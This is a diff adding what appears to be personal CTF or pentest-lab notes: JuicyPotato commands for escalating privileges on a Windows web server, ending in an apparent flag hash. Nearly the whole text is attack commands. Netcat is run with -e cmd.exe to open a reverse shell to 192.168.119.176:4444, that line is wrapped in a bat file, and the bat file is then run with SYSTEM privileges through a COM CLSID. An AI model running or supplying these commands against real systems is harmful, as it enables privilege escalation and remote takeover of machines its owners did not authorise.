@@ -1,0 +1,17 @@
+JuicyPotato -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\inetpub\wwwroot\nc64.exe -e cmd.exe 192.168.119.176 4444" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+
+
+... checking CSLID:
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 
+
+... creating bat script:
+
+echo C:\inetpub\wwwroot\nc64.exe -e cmd.exe 192.168.119.176 4444 > rev.bat
+
+... running bat script as root:
+
+JuicyPotato.exe -p C:\inetpub\wwwroot\rev.bat -l 4444 -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+
+9bfcbc326b7f9f35bc4152b9c98d40f0
+
